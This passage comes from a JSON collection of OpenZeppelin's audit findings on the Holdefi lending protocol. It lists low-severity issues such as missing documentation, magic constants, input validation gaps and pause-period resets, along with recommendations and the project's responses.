      "content": "The [README.md of the Holdefi project](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/README.md) has no information about what is the purpose of the project nor how to use it. README files on the root of git repositories are the first documents that most developers often read, so those should be complete, clear, concise, and accurate.\n\n\nConsider following [Standard Readme](https://github.com/RichardLitt/standard-readme) to define the structure and contents for the README file.\n\n\nAlso, consider including an explanation of the core concepts of the repository, the usage workflows, the public APIs, instructions to test and deploy it, and how the code relates to other key components of the project.\n\n\nFurthermore, it is highly advisable to include instructions for the [responsible disclosure](https://en.wikipedia.org/wiki/Responsible_disclosure) of any security vulnerabilities found in the project.  \n\nConsider adding a method for secure and encrypted communication with the team, like an email address with its GPG key.\n\n\n**Update**: *Not fixed. Holdefis statement for this issue:*\n\n\n\n> Its not a bug as well. We will add information in the readme file of course.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10961",
      "title": "[L14] Tests not passing successfully",
      "impact": "LOW",
      "content": "The testing suite finishes with three failing tests, two on the [`AdminFunctionTests.js`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/test/HoldefiTest/AdminFunctionTests.js) file and one on the [`OwnableTests.js`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/test/OwnableTests.js) file.\n\n\nAlthough the test suite was left outside of the audits scope, please consider thoroughly reviewing the test suite to make sure all tests run successfully. Furthermore, it is advisable to only merge code that neither breaks the existing tests nor decreases coverage.\n\n\n**Update**: *Not fixed. Holdefis statement on this issue:*\n\n\n\n> These fails are because of very little time difference, and its not a bug. This will be pass if you rerun it. Some of our calculations are based on timestamp and because of problem with exactly syncing with blockchain (local, testnet or mainnet), sometimes some tests will fail because of minor differences.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10960",
      "title": "[L13] Use of magic constants",
      "impact": "LOW",
      "content": "There are several occurrences of magic constants in [Holdefis codebase](https://github.com/holdefi/Holdefi/tree/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts). Some examples are:\n\n\n`Holdefi.sol`:  \n\n [Line 617](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L617), the `1` being added to the `deltaInterest` variable  \n\n [Line 655](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L655), the `500` subtracted to the `valueToLoanRate` variable  \n\n Lines [161](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L161), [174](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L174), [234](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L234), [248](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L248), [261](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L261), [298](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L298), [298](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L298), [298](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L298), [359](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L359), [382](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L382), [429](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L429), [464](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L464), and [481](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L481) when calling the `whenNotPaused` modifier with a parameter\n\n\nEven though the meaning of some of this constants [are mentioned as comments](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L9-L16) in the `HoldefiPauser` contract, there is no reference of them in the contract where the `wheNotPaused` modifier is being used, which makes the code harder to understand and maintain.\n\n\nIn addition to this, the references in the comments mentioned above are not consistent with the list of function codes for pausing operations in the specification, where the operation `3` is being skipped in the whitepaper.\n\n\nConsider defining a constant variable for every magic constant (including booleans) in the contract where they are used, giving it a clear and self-explanatory name. For complex values, consider adding an inline comment explaining how they were calculated or why they were chosen. All of this will allow a better readability, easing the codes maintenance.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10959",
      "title": "[L12] Default variable declaration values are used during calculations",
      "impact": "LOW",
      "content": "[In the codebase of the project](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts), there are several places in which the returned variable is declared in the function definition without the explicit `return` instruction within the functions body, as addressed in the issue *[N06] Named return variables*, but also there are places where the local variable is not assigned with an initial value.\n\n\nUsually, this does not bring problems because the default value of a variable would be overwritten by another one during the code execution, but in other cases, depending on how this variable is used, an issue may appear.\n\n\nIn [the `getAccountTotalBorrowValue` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L624) from the `Holdefi` contract, `totalBorrowValueScaled` is declared to represent the functions return value. This variable is then used in a `for` loop to accumulate the value of all borrows from a particular account, but during the first iteration, the default value of this variable is used for the calculation.\n\n\nSimilar cases can also be found in [the `totalDebt`, `assetPrice`, and `assetValueScaled` variables](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L628-L630) from [the `getAccountTotalBorrowValue` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L624), and in many other functions.\n\n\nAlthough it does not represent a problem in the current scenario, consider always declaring variables with an initial value to reduce the attack surface.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10958",
      "title": "[L11] Semantic overload",
      "impact": "LOW",
      "content": "[Throughout the codebase](https://github.com/holdefi/Holdefi/tree/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts), there are cases in which a single variable has two purposes, and, based on which its value is, the code can perform differently. For example:\n\n\nIn [the `HoldefiSettings` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol), the properties of a [market or collateral are stored inside structs](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L42-L60). These structs have [a flag called `isActive`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L43) which is raised when a [market or collateral is added to the whitelist](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L183), and [flagged down when the same asset is removed from the whitelist](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L206).\n\n\nNevertheless, because the parameters of the assets are not erased after [the `removeMarket` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L205) is called, the [`isActive` variable](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L43) is used to check not only [if the market exists](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L177) but also [if the market is active](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L121). The same analogous problem occurs with the collateral and its respective functions.\n\n\nIn [the `HoldefiPauser` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol), [an array to keep track of the timestamps](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L19) of the moment in which [the `pause` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L55) for each functionality was triggered is used, but also [this array is used as a flag](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L61) to know when the functionality is unpaused by [checking the arrays getter](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L19).\n\n\nThis is known as [Semantic Overload](https://forum.openzeppelin.com/t/watch-out-for-semantic-overloading/1088). If the multiple meanings of the variables and states are not totally clear when making changes to the code, it can introduce severe vulnerabilities. We strongly discourage its usage if possible.\n\n\nConsider explicitly setting independent flags to represent the state of the markets and collaterals instead of using the same variable for different purposes.\n\n\n**Update**: *Not fixed. Holdefis statement for this issue:*\n\n\n\n> You said that this is Semantic Overload and it may cause issues when it is not used properly, but you didnt explain that what is the issue.\n> \n> \n\n\n*We have updated our suggestion to make it clearer.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10957",
      "title": "[L10] Lack of input validation",
      "impact": "LOW",
      "content": "[Throughout the codebase](https://github.com/holdefi/Holdefi/tree/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts), there are certain functions and calculations that do not perform validation checks to ensure the validity of the inputs. Some of them are the following ones:\n\n\n* The [`withdraw` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/CollateralsWallet.sol#L20) in the `CollateralsWallet` contract does not check that the `recipient` is not the zero address.\n* The [`setPrice` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPrices.sol#L39) in the `HoldefiPrices` contract does not check whether the `newPrice` is the same as the old price, [triggering an event](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPrices.sol#L43) without any new relevant information.\n* The [`setPauseDuration` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L86) in the `HoldefiPauser` contract does not check the `newPauseDuration` parameter, which could be zero or a very long period of time, possibly locking important functions of the `Holdefi` system.\n\n\nEven though this issue does not pose a security risk, the lack of validation on user-controlled parameters may result in erroneous transactions considering that some clients or owners may default to sending null parameters if none are specified. Consider always adding validation checks to ensure that the parameters are always in the expected range of values.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10956",
      "title": "[L09] Lack of indexed parameters in events",
      "impact": "LOW",
      "content": "[Throughout the Holdefis codebase](https://github.com/holdefi/Holdefi/tree/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts), none of the parameters in the events defined in the contracts are indexed.\n\n\nConsider [indexing event parameters](https://solidity.readthedocs.io/en/latest/contracts.html#events) to avoid hindering the task of off-chain services searching and filtering for specific events.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10955",
      "title": "[L08] Overcomplicated return values",
      "impact": "LOW",
      "content": "[Throughout the projects codebase](https://github.com/holdefi/Holdefi/tree/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts), functions that return several variables are implemented, but when calling these functions, only a few or just one return parameter is used.  \n\nSome examples are:\n\n\n* The [`getCollateral`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L125) function in the `HoldefiSettings` contract returns the `isActive`, `valueToLoanRate`, `penaltyRate`, and `bonusRate` attributes, but when this function is called in the `Holdefi` contract, only one of these variables is accessed, such as in the [`collateralize`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L237), [`withdrawCollateral`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L271), and [`borrow`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L300) functions.\n* The [`getCurrentInterestIndex`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L507) function in `Holdefi` contract returns the `supplyIndex`, `supplyRate`, `borrowIndex`, `borrowRate`, and `currentTime` attributes, but only a few of these variables are being accessed, such as in the [`updateSupplyIndex`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L551) and [`updateBorrowIndex`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L561) functions.\n\n\nEven though this does not pose a security risk, it is very difficult to understand which variables are being accessed when calling a function without checking its signature. Additionally, returning big data structures will increase the gas costs, leading to higher prices when executing transactions.\n\n\nConsider identifying all the functions that follow this pattern and modularize them into smaller ones that return at most one variable each.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10954",
      "title": "[L07] Unneeded public visibility in some functions",
      "impact": "LOW",
      "content": "In [the Holdefi codebase](https://github.com/holdefi/Holdefi/tree/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts), there are situations in which functions have a public visibility although those are not called by any other function from the same contract. Some of them are:\n\n\n* In the `HoldefiPrices` contract, [the `addStableCoin` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPrices.sol#L47)\n* In the `HoldefiPauser` contract, [the `batchPause`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L65) and [the `batchUnpause`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L74) functions\n* In the `HoldefiSettings` contract, [the `getMarket` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L120). This function returns true if a certain market is whitelisted, but this information can be known by using [the `marketAssets` getter](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L63)\n\n\nTo favor readability and to reduce the attack surface, consider reducing the visibility of these functions and any similar case to `external`, and consider reducing the visibility of [the `marketAssets` variable](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L63) if [the `getMarket` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L120) is not removed from the codebase.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10953",
      "title": "[L06] Parameters time-off periods are uneven",
      "impact": "LOW",
      "content": "The [`HoldefiSettings` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol) uses [a 10-day time-off period](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L23) to prevent the owner to perform actions such as an increase in [the `borrowRate`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L141), [the `suppliersShareRate`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L162), [the `valueToLoanRate`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L245), and [the `penaltyRate`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L265).\n\n\nNevertheless, if the owner accidentally changes one of these values and sets up a lower value by mistake, [a 10-day time-off period](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L23) will have to be awaited before the parameters can be corrected, possibly affecting the finances of the platform in a drastic manner.\n\n\nIn addition to this, the awaiting period cannot be changed even by the owner. This means that once the platform is launched, if this period is too high, it will not allow the platform to compensate the dynamics of the market quickly enough.\n\n\nConsider simulating and documenting the selection of these unchangeable values, and taking extra caution before updating these parameters.\n\n\n**Update**: *Not fixed. Holdefis statement for this issue:*\n\n\n\n> Its not a bug. Its just a suggestion and a warning. We have to be careful about setting these parameters. But these parameters must exist for users to trust us and prove to them that we cant manipulate the platform.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10952",
      "title": "[L05] Pauser accounts can reset the pause period indefinitely",
      "impact": "LOW",
      "content": "The [`HoldefiPauser` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol) implements a pausable functionality for certain cases. [Each one of them](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L9-L16) are assigned to a specific index. Then, the timestamp of when a pause action has been triggered for a specific case is tracked in [the `paused` array](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L19) by using its index.\n\n\nThis feature provides child contracts with a system overhaul in cases that an unexpected event occurs and part of the code needs to be stopped. This feature can only [be called by the owner or the pauser](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L29), but on the other hand, the [`unpause` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L60) can only be called by the owner.\n\n\nNevertheless, if a particular functionality has been paused, in which [a `pauseDuration` should be waited](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L21) to have the paused functionality back, the pauser can re-call the [`pause` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiPauser.sol#L55) and reset the timer for that functionality, being possible to extend indefinitely the paused period. If this duality of having a bounded period that can be extended is the intended, the same could be implemented with a better design using a flag variable instead of a timestamp variable.\n\n\nConsider modifying the functionality to prevent multiple resets of the pause period by the pausers accounts, or documenting this if it is the expected behavior.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10951",
      "title": "[L04] OwnerChanger cannot renounce its role",
      "impact": "LOW",
      "content": "The role management scheme implemented in the [`Ownable` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol) does not include a way for [the `ownerChanger`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol#L6) to renounce the role they have been granted. This might become problematic in a scenario where the account wishes to renounce the role after the trusted device holding the private keys has been compromised.\n\n\nAlso, in the case where [the current `owner`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol#L5) may want to transfer its ownership with [the `transferOwnership` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol#L26), the `ownerChanger` could reject every single transfer at his will by not calling [the `acceptTransferOwnership` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Ownable.sol#L34), and as the `ownerChanger` role is not transferable, the `owner` role transfer operation could get compromised.\n\n\nConsider using multisig accounts for both roles to prevent that one of them becomes compromised, and adding the option to renounce the `ownerChanger` role if needed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10950",
      "title": "[L03] Borrowers are allowed to operatate after the maximum period has passed",
      "impact": "LOW",
      "content": "The [`Holdefi` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol) establishes a maximum period of time in which a borrower can be sure that his assets will not be liquidated. This [period](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L42) is defined as the number of seconds in a regular year.\n\n\nNevertheless, this restriction is not being applied on all the functions, and it is only used as a limit in [the `liquidateBorrowerCollateral`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L432). This could lead into a hypothetical scenario where a borrower could continue with his borrowing for a period greater than that year in the case where there are no liquidators performing their liquidation duty.\n\n\nAdditionally, a borrower in such condition who has an account which has been a whole year without activity could frontrun a liquidator when the transaction that calls [the `liquidateBorrowerCollateral` function](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/Holdefi.sol#L432) enters into the mempool, maximizing the period of time for his position beyond the established limit.\n\n\nConsider adding requirements in all functions related to the financial aspect of the contract to restrict the borrowers actions after the maximum period of time has been achieved instead of relying on the liquidators actions only.\n\n\nAlternatively, if there is a good reason for this design consider documenting it in the docstrings of the affected functions.\n\n\n**Update**: *Not fixed. Holdefis statement for this issue:*\n\n\n\n> In this case, there is no problem that borrowers are allowed to operatate just after the maximum period has passed. His/her account will be liquidated in the first transaction after this period. The reason that we added this time is that if the borrower dies or loses his/her wallet or any other reason that can not get his/her debt back into the platform, suppliers be sure that their tokens will be back. There is no problem if borrower is alive and can perform any action with Holdefi contract after one year.\n> \n> \n\n\n*We have updated our suggestion to make it clearer.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10949",
      "title": "[L02] Collaterals and markets can be updated after being deactivated",
      "impact": "LOW",
      "content": "The [`HoldefiSettings` contract](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol) defines a mapping of [`collateralAssets`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L67) to store [information about collaterals](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L53), and a mapping of [`marketAssets`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L63) to store information about markets. Even though in both data structures there is an `isActive` flag defined to check whether a `collateralAsset` or `marketAsset` is active or not, it is not being used on the [`setValueToLoanRate`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L237), [`setPenaltyRate`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L256), [`setBonusRate`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L276), [`removeMarket`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L205), [`setSuppliersShareRate`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L156), and the [`setBorrowRate`](https://github.com/holdefi/Holdefi/blob/f4df394d7cf6df347b1f1e9af8e2676c5933c2c9/contracts/HoldefiSettings.sol#L135) functions, leading to scenarios where deactivated collaterals and markets can be updated, and undesired event emissions will be triggered.\n\n\nAs addressed in the issue **[H02] Markets are not being properly removed from the markets list**, consider renaming the functions to reflect the current functionality of the code, and adding a third state for those markets that are still operational but are not active, while checking the state of a given collateral or market at the beginning of the functions mentioned above.\n\n\n**Update**: *Not fixed. Holdefis statement for this issue:*\n\n\n\n> Removing a market o collateral in the Holdefi means that nobody can supply or borrow or add collateral. But old users can withdraw supply or repay borrow. So we can set new rates (VTL rate, bonus rate, ) for them.\n> \n> \n\n\n*We have updated our suggestion to make it clearer.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Holdefi Audit",
      "source_link": "https://blog.openzeppelin.com/holdefi-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10948",
      "title": "[L01] Transfer method is used to send ETH",
      "impact": "LOW",
